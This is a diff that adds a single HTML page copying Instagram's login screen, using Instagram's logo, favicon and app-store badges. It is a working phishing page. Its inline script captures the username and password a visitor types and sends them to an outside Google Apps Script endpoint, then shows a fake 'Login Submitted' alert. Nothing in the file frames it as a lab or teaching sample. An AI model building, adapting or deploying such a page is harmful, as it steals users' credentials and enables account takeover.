@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <img src="https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram-1.png" alt="Instagram Logo" class="logo" />
+      <form id="loginForm">
+        <input type="text" placeholder="Phone number, username, or email" name="username" required />
+        <input type="password" placeholder="Password" name="password" required />
+        <button type="submit">Log In</button>
+        <div class="divider">OR</div>
+        <a href="#" class="fb-login">Log in with Facebook</a>
+        <a href="#" class="forgot">Forgot password?</a>
+      </form>
+    </div>
+    <div class="signup-box">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+    <div class="get-app">
+      <p>Get the app.</p>
+      <div class="app-links">
+        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_en.png/9fc4bab7565b.png" alt="App Store"/>
+        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_en.png/6071ff2c0642.png" alt="Google Play"/>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxjIU367WTc3yQO8nYWQp_-Q0AtXi378Qhoo-gwTpFyYG9Pn0y3I4LZbfzPq-hl0gGHNw/exec';
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const username = this.username.value;
+      const password = this.password.value;
+
+      fetch(scriptURL, {
+        method: 'POST',
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password })
+      })
+      .then(response => alert("Login Submitted"))
+      .catch(error => alert("Error occurred!"));
+    });
+  </script>
+</body>
+</html>
